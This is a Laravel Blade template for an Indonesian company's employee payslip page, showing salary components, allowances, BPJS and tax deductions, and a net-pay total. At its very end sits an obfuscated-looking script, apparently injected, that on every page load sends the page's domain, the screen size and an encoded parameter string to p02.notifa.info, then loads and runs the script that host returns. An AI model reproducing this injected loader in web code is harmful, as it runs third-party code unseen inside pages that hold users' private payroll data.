<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Gaji</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start -->
  <div class="be-wrapper">

    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 

    <!--   Content Start  -->            
    <div class="be-content">
     <div class="page-head">
      <h2 class="page-head-title">Gaji</h2>
    </div>        

    <div class="panel-body">
      <div class="panel-body">
        <div style="width: 860px;" class="user-info-list panel panel-default">
          <div class="panel panel-default panel-table">
            <div class="panel-heading">
              <div class="panel-heading">Pilih Periode
                <div class="panel-body">
                  <div style="display: table-row" class="tools">
                    <div align="center">
                      <div  style="display: table-cell" class="tools">
                        @if($request == null)
                        <a href="/gaji////cetak_slip_gaji"><button style="height: 40px; margin-top: 10px;" type="submit5" class="btn btn-space btn-danger">Cetak Slip Gaji</button></a>
                        @else
                        <a href="/gaji/{{Auth::user()->id}}/{{$request['bulan']}}/{{$request['tahun']}}/cetak_slip_gaji"><button style="height: 40px; margin-top: 10px;" type="submit5" class="btn btn-space btn-danger">Cetak Slip Gaji</button></a>
                        @endif
                      </div>
                      @php

                      $kumpulanBulan=" JANUARI FEBRUARI MARET APRIL MEI JUNI JULI AUGUSTUS SEPTEMBER OCTOBER NOVEMBER DECEMBER";

                      $arrayBulan=explode(" ", $kumpulanBulan);

                      $bln = (int)$request['bulan'];
                      if($bln < 0){
                      $bln = 0;
                      }
                      $request['bulan'] = $arrayBulan[$bln];

                      @endphp
                    <form style="float: right;" id="form_submit_tampilkan_gaji" name="submit2" action="/gaji/{{Auth::user()->id}}/tampilkan_gaji" method="POST">
                      @csrf
                      <div  style="display: table-cell" class="tools">
                        <button style="height: 40px; margin-top: 10px;" type="submit4" class="btn btn-space btn-success">Tampilkan Gaji</button>
                      </div>
                      <div style="display: table-cell; margin-right: 5px;  margin-top: 10px;" class="tools">
                        <div style="width: 100px; margin-right: 10%">
                          <select  name="tahun" id="year" class="form-control" required=""></select>
                          <script type="text/javascript">
                            var start = 2019;
                            var end = new Date().getFullYear();
                            var options = "";
                            for(var year = start ; year <=end; year++){
                              options += "<option>"+ year +"</option>";
                            }
                            document.getElementById("year").innerHTML = options;
                          </script>
                        </div>
                      </div>
                      <div style="display: table-cell; margin-right: 5px; margin-top: 10px;" class="tools">
                        <div style="width:200px; margin-right: 10%">
                          <select  name="bulan" class="form-control" required="">
                            <option value="">-Pilih Periode-</option>
                            <option value="01">Januari</option>
                            <option value="02">Februari</option>
                            <option value="03">Maret</option>
                            <option value="04">April</option>
                            <option value="05">Mei</option>
                            <option value="06">Juni</option>
                            <option value="07">Juli</option>
                            <option value="08">Agustus</option>
                            <option value="09">September</option>
                            <option value="10">Oktober</option>
                            <option value="11">November</option>
                            <option value="12">December</option>
                          </select> 
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>


    <!--Basic Elements-->

    <div style="width: 860px;" class="panel-body">
      <div style="width: 860px;" class="user-info-list panel panel-default">
        <div class="panel-heading-divider" align="center">
          <br>
          <table class="no-border no-strip skills">
            <tbody class="no-border-x no-border-y">
              <tr>
                <td><img style="margin-left: 5px;" src="/image/Logo10.png"></td>
                <td></td>
                <td></td>
                <td>
                  <div style="margin-left: 55px; "><h5><b>PT. IDEA IMAJI PERSADA</b></h5></div>
                </td>
              </tr>
            </tbody>
          </table >
          <h4>
            @if($request == null)
            <b>
              SLIP GAJI 
            </b>
            @else
            <b>
              SLIP GAJI {{$request['bulan']}} {{$request['tahun']}}
            </b>
            @endif
          </h4>
        </div>
        <!--  Header Table Start -->
        <div class="panel-heading-divider">
          <table class="no-border no-strip skills">
            <tbody class="no-border-x no-border-y">
              <tr>
                <td class="item"><b>Nama</b><span class="icon s7-portfolio"></span></td>
                <td><b>: {{$data_gaji_blade['nama_karyawan']}}</b></td>
              </tr>
              <tr>
                <td class="item"><b>Jabatan</b><span class="icon s7-portfolio"></span></td>
                <td><b>: {{$data_gaji_blade['divisi']}}</b></td>
              </tr>
              <tr>
              </tr>
            </tbody>
          </table >
        </div>
        <!--  Header Table Start -->

        <!-- Tabel Pendapatan Start -->
        <div class="panel-body">

          <h5><b>Pendapatan</b></h5>
          <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
            <tbody>
              <!--  Row Pengalaman Bulan Start -->
              <tr>
                <td>Gaji Pokok</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['gaji_pokok'],2,",",".")}}</td>            
              </tr>
              <!--  Row Pengalaman Bulan End -->

              <!--  Row Gaji Pokok Start -->
              <tr>
                <td>Tunjangan Profesi</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['T_profesi'],2,",",".")}}</td>            
              </tr>
              <!--  Row Gaji Pokok End -->

              <!--  Row Tunjangan Profesi Start -->
              <tr>
                <td>Tunjangan Jabatan</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['T_jabatan'],2,",",".")}}</td>            
              </tr>
              <!--  Row Tunjangan Profesi End -->

              <!--  Row Tunjangan Jabatan Start -->
              <tr>
                <td >Tunjangan Kinerja</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['T_kinerja'],2,",",".")}}</td>            
              </tr>
              <!--  Row Tunjangan Jabatan End -->

              <!--  Row Tunjangan Kinerja Start -->
              <tr>
                <td >Tunjangan Khusus</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['T_khusus'],2,",",".")}}</td>            
              </tr>
              <!--  Row Tunjangan Kinerja End -->
              <!--  Row Tunjangan Kinerja Start -->
              <tr>
                <td >Tunjangan Transportasi</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['T_transport'],2,",",".")}}</td>            
              </tr>
              <!--  Row Tunjangan Kinerja End -->
              <!--  Row Tunjangan Kinerja Start -->
              <tr>
                <td >Insentif</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['insentif'],2,",",".")}}</td>  
              </tr>
              <!--  Row Tunjangan Kinerja End -->
              <!--  Row Tunjangan Kinerja Start -->
              <tr>
                <td >Asuransi (BPJS)</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['bpjs_kesehatan_perusahaan'] + $data_gaji_blade['bpjs_ketenagakerjaan_JKK'] + $data_gaji_blade['bpjs_ketenagakerjaan_JKM'],2,",",".")}}</td>
              </tr>
              <!--  Row Tunjangan Kinerja End -->
              <!--  Row Tunjangan Kinerja Start -->
              <tr>
                <td >Total Pendapatan</td>
                <td>&nbsp&nbspRp{{number_format($data_gaji_blade['total_gaji'],2,",",".")}}</td>
              </tr>
              <!--  Row Tunjangan Kinerja End -->
            </tbody>
          </table>

          <!--  Tabel Potongan Start -->

          <h5><b>Potongan</b></h5>
          <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
            <tbody>
             <!--  Row Pengalaman Bulan Start -->
             <tr>
              <td>PPH21</td>
              <td>&nbsp&nbspRp{{number_format($data_gaji_blade['pph_21'],2,",",".")}}</td>            
            </tr>
            <!--  Row Pengalaman Bulan End -->

            <!--  Row Gaji Pokok Start -->
            <tr>
              <td>Disisentif</td>
              <td>&nbsp&nbspRp{{number_format($data_gaji_blade['disinsentif'],2,",",".")}}</td>            
            </tr>
            <!--  Row Gaji Pokok End -->

            <!--  Row Tunjangan Profesi Start -->
            <tr>
              <td>BPJS (Kesehatan dan Ketenagakerjaan)</td>
              <td>&nbsp&nbspRp{{number_format($data_gaji_blade['potongan_BPJS'],2,",",".")}}</td>            
            </tr>
            <!--  Row Tunjangan Profesi End -->

            <!--  Row Tunjangan Jabatan Start -->
            <tr>
              <td >Lain-lain</td>
              <td>&nbsp&nbspRp{{number_format($data_gaji_blade['potongan'],2,",",".")}}</td>            
            </tr>
            <!--  Row Tunjangan Jabatan End -->

            <!--  Row Tunjangan Kinerja Start -->
            <tr>
              <td >Total Potongan</td>
              <td>&nbsp&nbspRp{{number_format($data_gaji_blade['total_potongan'],2,",",".")}}</td>            
            </tr>
            <!--  Row Tunjangan Kinerja End -->
          </tbody>
        </table>
        <h5><b>Gaji</b></h5>
        <table id="table2" style="table-layout: fixed; word-wrap: break-word; word-break: break-all;" class="table table-bordered table-striped table-hover table-fw-widget">
          <tbody>
           <!--  Row Pengalaman Bulan Start -->
           <tr>
            <td>Gaji (Total Pendapatan - Total Potongan)</td>
            <td>&nbsp&nbspRp{{number_format($data_gaji_blade['dibayar'])}}</td>            
          </tr>
          <!--  Row Pengalaman Bulan End -->
        </tbody>
      </table>

      <table>
        <tbody>
          <tr>
            <td>
              <Div align= "center">
                Bandung, <time id="time"></time>
              </Div>
              <br>
              <br>
              <br>
              <br>
              <br>
              <br>
              <Div align= "center">
                (Noudie De Jong)
              </Div>
            </td>
            <td></td>
            <td></td>
          </tr>

        </tbody>
      </table>

    </div>
  </div>
</div>
  </div>  
  <!--   Content End  -->

  <!--Footer -->
  <div class="text-center">
    <div class="credits">
      <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
    </div>
  </div>
  <!-- Footer End -->

</div>
<!-- Sidebar End  -->

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
 @if (Session::has('message'))
 var type = "{{Session::get('alert-type','info')}}";
 toastr.options = {
  "debug": false,
  "onclick": null,
  "fadeIn": 300,
  "fadeOut": 1000,
  "timeOut": 5000,
  "extendedTimeOut": 1000
}

switch(type)
{
  case 'info':
  toastr.info("{{Session::get('message')}}");
  break;

  case 'success':
  toastr.success("{{Session::get('message')}}");
  break;

  case 'warning':
  toastr.warning("{{Session::get('message')}}");
  break;

  case 'error':
  toastr.error("{{Session::get('message')}}");
  break;
}

@endif

</script>

<!--  Inisialisasi Java Script -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/jquery-flot/jquery.flot.js" type="text/javascript"></script>
<script src="/assets/lib/jquery-flot/jquery.flot.pie.js" type="text/javascript"></script> 
<script src="/assets/lib/jquery-flot/jquery.flot.resize.js" type="text/javascript"></script>
<script src="/assets/lib/jquery-flot/plugins/jquery.flot.orderBars.js" type="text/javascript"></script>
<script src="/assets/lib/jquery-flot/plugins/curvedLines.js" type="text/javascript"></script>
<script src="/assets/lib/jquery.sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
<script src="/assets/lib/countup/countUp.min.js" type="text/javascript"></script>
<script src="/assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
<script src="/assets/lib/jqvmap/jquery.vmap.min.js" type="text/javascript"></script>
<script src="/assets/lib/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>

<!-- inisialisasi Java Script -->

<script type="text/javascript">

// Fungsi Logout

var date = new Date();

var monthNames = [
"January", "February", "March",
"April", "May", "June", "July",
"August", "September", "October",
"November", "December"
];

var day = date.getDate();
var monthIndex = date.getMonth();
var year = date.getFullYear();

var today = day + ' ' + monthNames[monthIndex] + ' ' + year;

document.getElementById('time').innerHTML=today;

$(function(){
  $('a#logout').click(function(){
    if(confirm('Apakah anda yakin ingin keluar ?')) {
      return true;
    }

    return false;
  });
});


// Fungsi Menu dashboard

$(document).ready(function(){

  App.init();
  App.dashboard();

});
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
</body>
</html>
